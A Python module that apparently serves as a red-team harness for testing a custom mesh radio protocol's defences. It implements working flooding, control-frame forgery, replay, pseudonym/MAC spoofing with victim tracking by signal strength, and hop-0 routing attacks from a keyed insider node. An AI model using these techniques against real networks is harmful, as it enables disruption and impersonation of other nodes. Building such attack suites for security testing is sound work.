"""Attack implementations for X (decision 20; specs in security/attacks/README.md).

Every attack is `fn(ctx, duration_s) -> frames sent`, registered in ATTACKS[(label, variant)].
`ctx` (AttackContext) holds the radio, X's keys, the stop flag, and two observers that run for the
whole session: a buffer of recently heard frames (for replays) and a per-epoch table of transmitters
(for the spoofer's victim tracking).

Threading: listeners run on XRadio's reader thread and must never call set_mac (it waits for a reply
that only the reader thread can deliver). Attacks that react to traffic (routing) hand frames to their
own loop through a queue.
"""
import collections
import os
import queue
import random
import threading
import time

import gmx

RANDOM = random.SystemRandom()


def random_la_mac():
    """A random locally administered unicast MAC (what boards use, so it doesn't stand out)."""
    m = bytearray(os.urandom(6))
    m[0] = (m[0] & 0xFC) | 0x02
    return bytes(m)


def random_pseudo():
    while True:
        p = int.from_bytes(os.urandom(4), "big")
        if p not in gmx.RESERVED_PSEUDOS:
            return p


class HeardBuffer:
    """DATA/KEYS frames X heard in the last keep_s seconds, oldest first (replay source)."""

    def __init__(self, keep_s=300):
        self.keep_ms = keep_s * 1000
        self.frames = collections.deque()          # (laptop_ms, raw)
        self.lock = threading.Lock()

    def __call__(self, h):
        if h.frame.ver_type not in (gmx.DATA, gmx.KEYS):
            return
        with self.lock:
            self.frames.append((h.laptop_ms, h.raw))
            cut = h.laptop_ms - self.keep_ms
            while self.frames and self.frames[0][0] < cut:
                self.frames.popleft()

    def snapshot(self):
        with self.lock:
            return list(self.frames)


class Transmitters:
    """Per epoch: each pseudonym heard (with a valid link_tag), its radio MAC and RSSI (spoof victims)."""

    def __init__(self, network_key):
        self.net = network_key
        self.by_epoch = collections.defaultdict(dict)   # epoch -> pseudo -> {"mac", "rssi": [..], "n"}
        self.lock = threading.Lock()

    def __call__(self, h):
        f = h.frame
        if not f.link_ok(self.net):
            return
        with self.lock:
            e = self.by_epoch[f.epoch].setdefault(f.src_pseudo, {"mac": h.mac, "rssi": collections.deque(maxlen=20), "n": 0})
            e["rssi"].append(h.rssi)
            e["n"] += 1
            e["mac"] = h.mac
            if len(self.by_epoch) > 4:
                del self.by_epoch[min(self.by_epoch)]

    def seen(self, epoch, exclude=(), min_frames=3):
        """[(pseudo, mac, mean_rssi)] heard in this epoch with at least min_frames frames."""
        with self.lock:
            rows = []
            for p, e in self.by_epoch.get(epoch, {}).items():
                if p in exclude or e["n"] < min_frames:
                    continue
                rows.append((p, e["mac"], sum(e["rssi"]) / len(e["rssi"])))
            return rows


class AttackContext:
    def __init__(self, radio, keys, stop=None):
        self.radio = radio
        self.keys = keys
        self.stop = stop or threading.Event()
        self.mac_now = None                          # what we last told X to use
        self.buffer = HeardBuffer()
        self.txs = Transmitters(keys.network_key)
        radio.on_frame(self.buffer)
        radio.on_frame(self.txs)
        self.victim_hint = None                      # optional pseudonym (int) to spoof first

    def set_mac(self, mac):
        mac = bytes(mac)
        if mac != self.mac_now:
            self.radio.set_mac(mac)
            self.mac_now = mac

    def epoch(self):
        return self.radio.clock.epoch()

    def as_x(self):
        """X's own identity for this epoch (sets the radio MAC when the epoch changes). -> (pseudo, epoch)."""
        ep = self.epoch()
        self.set_mac(gmx.mac_for(self.keys.pseudo_secret, ep))
        return gmx.pseudonym(self.keys.pseudo_secret, ep), ep

    def own_pseudos(self):
        ep = self.epoch()
        return {gmx.pseudonym(self.keys.pseudo_secret, (ep + d) & 0xFFFF) for d in (-1, 0, 1)}

    def close(self):
        self.radio.remove_listener(self.buffer)
        self.radio.remove_listener(self.txs)


# ---- flood ------------------------------------------------------------------------------

def _padded_ttl_hop():
    pad = RANDOM.randint(0, 2)                       # hop padding like a real originator (10a)
    return gmx.DEFAULT_TTL - pad, pad


def flood_insider(rate):
    def run(ctx, duration_s):
        def make():
            pseudo, ep = ctx.as_x()
            ttl, hop = _padded_ttl_hop()
            return gmx.random_data_frame(ctx.keys.network_key, pseudo, ep, ttl=ttl, hop=hop)
        return gmx.paced(ctx.radio, make, rate, duration_s, ctx.stop)
    return run


def flood_outsider(ctx, duration_s, rate=50):
    """No keys: random pseudonym, random tag (fails link_tag), one random MAC for the run."""
    ctx.set_mac(random_la_mac())
    pseudo = random_pseudo()

    def make():
        ttl, hop = _padded_ttl_hop()
        f = gmx.Frame(gmx.DATA, 0, os.urandom(8), ttl, hop, pseudo, 0, ctx.epoch(), os.urandom(8), os.urandom(210))
        if f.link_ok(ctx.keys.network_key):          # 2^-64: never, but an outsider frame must fail
            f.tag = bytes(b ^ 0xFF for b in f.tag)
        return f
    return gmx.paced(ctx.radio, make, rate, duration_s, ctx.stop)


def flood_cycling(ctx, duration_s, rate=50, per_identity=5):
    """Insider frames under a new random pseudonym + MAC every `per_identity` frames (10b/10g residual)."""
    state = {"left": 0, "pseudo": 0}

    def make():
        if state["left"] == 0:
            ctx.set_mac(random_la_mac())
            state["pseudo"], state["left"] = random_pseudo(), per_identity
        state["left"] -= 1
        ttl, hop = _padded_ttl_hop()
        return gmx.random_data_frame(ctx.keys.network_key, state["pseudo"], ctx.epoch(), ttl=ttl, hop=hop)
    return gmx.paced(ctx.radio, make, rate, duration_s, ctx.stop)


def flood_ctrl_forgery(ctx, duration_s, rate=20):
    """CTRL TIME/BLOCK frames with garbage signatures and a fresh issued_at, as X (16d)."""
    state = {"sub": gmx.CTRL_TIME}

    def make():
        pseudo, ep = ctx.as_x()
        rest = bytearray(os.urandom(210))
        rest[24] = state["sub"]
        rest[25:33] = int(ctx.radio.clock.now_ms() + 1000).to_bytes(8, "big")   # newer than W's last beacon
        state["sub"] = gmx.CTRL_BLOCK if state["sub"] == gmx.CTRL_TIME else gmx.CTRL_TIME
        f = gmx.Frame(gmx.CTRL, 0, os.urandom(8), 7, 0, pseudo, 0, ep, b"\0" * 8, bytes(rest))
        return f.sign(ctx.keys.network_key)
    return gmx.paced(ctx.radio, make, rate, duration_s, ctx.stop)


# ---- replay -----------------------------------------------------------------------------

def replay(age_s, rate=5, slack_s=2.0):
    """Resend, unchanged, DATA/KEYS frames heard age_s seconds ago, sampled to `rate` per second."""
    def run(ctx, duration_s):
        state = {"last": -1.0}

        def make():
            ctx.as_x()                                # X's own MAC: never the board's factory MAC
            target = gmx.MeshClock.laptop_ms() - age_s * 1000
            for t, raw in ctx.buffer.snapshot():
                if t <= state["last"]:
                    continue
                if t > target:
                    return None                       # nothing old enough yet
                if t < target - slack_s * 1000:
                    continue                          # too old for this age: skip ahead
                state["last"] = t
                return raw
            return None
        return gmx.paced(ctx.radio, make, rate, duration_s, ctx.stop)
    return run


# ---- spoof ------------------------------------------------------------------------------

def spoof(copy_mac, rate=5, settle_s=10.0, min_frames=2):
    """Random DATA under a victim's current pseudonym; follow the victim across rotations by RSSI.

    After a rotation the script waits settle_s before re-picking, so every node has been heard under its
    new pseudonym (real nodes send only ~0.5 frames/s); picking earlier can latch onto the wrong node.
    """
    def run(ctx, duration_s):
        v = {"pseudo": None, "mac": None, "rssi": None, "epoch": None, "new_epoch_at": None}

        def acquire(ep):
            if v["rssi"] is not None:                 # a rotation: let every node show its new pseudonym first
                if v["new_epoch_at"] is None:
                    v["new_epoch_at"] = time.monotonic()
                if time.monotonic() - v["new_epoch_at"] < settle_s:
                    return False
            rows = ctx.txs.seen(ep, exclude=ctx.own_pseudos(), min_frames=min_frames)
            if not rows:
                return False
            v["new_epoch_at"] = None
            if v["rssi"] is None:                      # first pick: the named pseudonym, else the strongest
                hint = [r for r in rows if r[0] == ctx.victim_hint]
                p, mac, rssi = hint[0] if hint else max(rows, key=lambda r: r[2])
            else:                                      # after a rotation: closest RSSI to the victim's last
                p, mac, rssi = min(rows, key=lambda r: abs(r[2] - v["rssi"]))
            v.update(pseudo=p, mac=mac, rssi=rssi, epoch=ep)
            print(f"  [spoof] victim this epoch: pseudo {p:08x} mac {mac} rssi {rssi:.0f}", flush=True)
            return True

        def make():
            ep = ctx.epoch()
            if v["epoch"] != ep and not acquire(ep):
                return None                            # victim not re-found yet in this epoch: wait
            if copy_mac:
                ctx.set_mac(gmx.mac_bytes(v["mac"]))
            else:
                ctx.as_x()
            ttl, hop = _padded_ttl_hop()
            return gmx.random_data_frame(ctx.keys.network_key, v["pseudo"], ep, ttl=ttl, hop=hop)
        return gmx.paced(ctx.radio, make, rate, duration_s, ctx.stop)
    return run


# ---- routing ----------------------------------------------------------------------------

def routing(fix_ttl, max_rate=gmx.MAX_RATE_HZ):
    """Relay every DATA/KEYS frame X hears, as X, claiming hop 0 (optionally TTL raised to hide it)."""
    def run(ctx, duration_s):
        inbox = queue.Queue(maxsize=1000)
        done = set()

        def listener(h):
            f = h.frame
            if f.ver_type in (gmx.DATA, gmx.KEYS) and f.msg_id not in done:
                try:
                    inbox.put_nowait(h)
                except queue.Full:
                    pass

        ctx.radio.on_frame(listener)
        sent, end = 0, time.monotonic() + duration_s
        next_ok = time.monotonic()
        try:
            while time.monotonic() < end and not ctx.stop.is_set():
                try:
                    h = inbox.get(timeout=0.1)
                except queue.Empty:
                    continue
                f = h.frame
                if f.msg_id in done or f.src_pseudo in ctx.own_pseudos() or not f.link_ok(ctx.keys.network_key):
                    continue
                if not fix_ttl and f.ttl == 0:
                    continue
                done.add(f.msg_id)
                pseudo, _ = ctx.as_x()
                g = gmx.Frame.parse(f.to_bytes())
                g.hop = 0
                g.ttl = gmx.DEFAULT_TTL if fix_ttl else f.ttl - 1
                g.src_pseudo = pseudo
                g.sign(ctx.keys.network_key)
                wait = next_ok - time.monotonic()
                if wait > 0:
                    time.sleep(wait)
                ctx.radio.send(g)
                next_ok = time.monotonic() + 1.0 / max_rate
                sent += 1
        finally:
            ctx.radio.remove_listener(listener)
        return sent
    return run


ATTACKS = {
    ("flood", "loud"): flood_insider(80),
    ("flood", "slow"): flood_insider(15),
    ("flood", "low_slow"): flood_insider(8),
    ("flood", "outsider"): flood_outsider,
    ("flood", "cycling"): flood_cycling,
    ("flood", "ctrl_forgery"): flood_ctrl_forgery,
    ("replay", "age_30s"): replay(30),
    ("replay", "age_90s"): replay(90),
    ("replay", "age_240s"): replay(240),
    ("spoof", "pseudo"): spoof(copy_mac=False),
    ("spoof", "pseudo_mac"): spoof(copy_mac=True),
    ("routing", "hop0"): routing(fix_ttl=False),
    ("routing", "hop0_ttlfix"): routing(fix_ttl=True),
}
